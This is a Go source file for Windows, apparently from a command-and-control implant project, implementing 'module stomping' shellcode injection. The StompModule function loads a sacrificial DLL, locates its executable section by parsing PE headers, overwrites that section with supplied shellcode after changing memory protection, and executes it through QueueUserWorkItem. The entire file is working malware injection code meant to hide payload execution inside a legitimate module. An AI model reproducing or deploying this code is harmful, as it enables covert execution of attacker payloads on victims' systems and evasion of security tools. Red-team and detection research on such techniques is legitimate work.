//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// PE header types for .text section lookup
type stompDosHeader struct {
	eMagic  uint16
	_       [29]uint16
	eLfanew int32
}

type stompFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type stompOptHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]stompDataDir
}

type stompDataDir struct {
	VirtualAddress uint32
	Size           uint32
}

type stompNtHeaders64 struct {
	Signature      uint32
	FileHeader     stompFileHeader
	OptionalHeader stompOptHeader64
}

type stompSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

const (
	stompDosSignature uint16 = 0x5A4D
	stompNtSignature  uint32 = 0x00004550
	stompScnCntCode   uint32 = 0x00000020
)

// StompModule loads a sacrificial DLL, overwrites its .text section with shellcode,
// then queues a user work item to execute the shellcode in-process.
func StompModule(sacrificialDLL string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	dllNameB, err := windows.BytePtrFromString(sacrificialDLL)
	if err != nil {
		return fmt.Errorf("BytePtrFromString: %w", err)
	}
	hMod, _, e := winsyscall.ProcLoadLibraryA.Call(uintptr(unsafe.Pointer(dllNameB)))
	if hMod == 0 {
		return fmt.Errorf("LoadLibraryA(%s): %v", sacrificialDLL, e)
	}

	base := hMod

	dos := (*stompDosHeader)(unsafe.Pointer(base))
	if dos.eMagic != stompDosSignature {
		return fmt.Errorf("invalid DOS signature")
	}

	nt := (*stompNtHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if nt.Signature != stompNtSignature {
		return fmt.Errorf("invalid NT signature")
	}

	numSections := nt.FileHeader.NumberOfSections
	firstSection := uintptr(unsafe.Pointer(&nt.OptionalHeader)) +
		uintptr(nt.FileHeader.SizeOfOptionalHeader)

	var textVA uintptr
	var textSize uint32
	for i := uint16(0); i < numSections; i++ {
		sec := (*stompSectionHeader)(unsafe.Pointer(firstSection + uintptr(i)*unsafe.Sizeof(stompSectionHeader{})))
		if sec.Characteristics&stompScnCntCode != 0 && sec.SizeOfRawData > 0 {
			textVA = base + uintptr(sec.VirtualAddress)
			textSize = sec.SizeOfRawData
			break
		}
	}

	if textVA == 0 {
		return fmt.Errorf("no executable section found in %s", sacrificialDLL)
	}

	if uint32(len(shellcode)) > textSize {
		return fmt.Errorf("shellcode (%d bytes) exceeds .text section (%d bytes)", len(shellcode), textSize)
	}

	var oldProtect uint32
	r, _, e := winsyscall.ProcVirtualProtect.Call(
		textVA, uintptr(len(shellcode)),
		uintptr(winsyscall.PageReadWrite), uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect(RW): %v", e)
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(textVA)), len(shellcode))
	copy(dst, shellcode)

	winsyscall.ProcVirtualProtect.Call(textVA, uintptr(len(shellcode)), uintptr(winsyscall.PageExecRead), uintptr(unsafe.Pointer(&oldProtect)))

	r, _, e = winsyscall.ProcQueueUserWorkItem.Call(textVA, 0, 0)
	if r == 0 {
		return fmt.Errorf("QueueUserWorkItem: %v", e)
	}

	return nil
}
